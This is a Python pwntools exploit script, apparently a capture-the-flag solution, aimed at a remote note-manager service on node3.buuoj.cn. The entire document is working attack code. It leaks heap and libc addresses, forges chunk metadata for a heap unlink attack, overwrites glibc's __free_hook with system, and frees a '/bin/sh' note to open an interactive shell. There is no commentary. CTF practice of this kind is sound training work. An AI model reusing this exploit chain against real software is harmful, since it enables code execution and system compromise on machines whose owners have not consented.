from pwn import *
#p=process('./1')
p=remote('node3.buuoj.cn',25317)
elf=ELF('1')
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
libc=ELF('libc-2.23_64.so')
context.terminal = ['tmux','splitw','-h']
def debug():
    gdb.attach(p)
    pause()
def list():
    p.recvuntil('Your choice: ')
    p.sendline('1')
def new(len,con):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Length of new note: ')
    p.sendline(str(len))
    p.recvuntil('Enter your note: ')
    p.sendline(str(con))
def edit(idx,len,con):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Note number: ')
    p.sendline(str(idx))
    p.recvuntil('Length of note: ')
    p.sendline(str(len))
    p.recvuntil('Enter your note: ')
    p.sendline(str(con))
def delete(idx):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Note number: ')
    p.sendline(str(idx))
for i in range(4):
    new(0x80,0x80*'a')

delete(0)
delete(2)
for i in range(2):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Length of new note: ')
    p.sendline('8')
    p.recvuntil('Enter your note: ')
    p.send(0x8*'a')
list()
p.recvuntil(8*'a')
heap=u64(p.recvline().strip("\x0a").ljust(8, "\x00"))-0x1940
libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4b20-88
#libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-libc.sym['main_arena']-88
print hex(heap)
print hex(libc.address)
for i in range(4):
    delete(i)
payload=p64(0)*2
payload+=p64(heap+0x30-0x18)+p64(heap+0x30-0x10)
new(0x20,payload)
new(8,'/bin/sh\x00')
payload=0x80*'a'+p64(0x1a0)+p64(0x90)+0x80*'a'+p64(0)+p64(0x21)+0x18*'a'+'\x01'
new(len(payload),payload)
delete(3)
#unlink
payload=p64(2)+p64(1)+p64(8)+p64(libc.sym['__free_hook'])
edit(0,0x20,payload)
print hex(libc.sym['system'])
edit(0,0x8,p64(libc.sym['system']))
delete(1)
p.interactive()
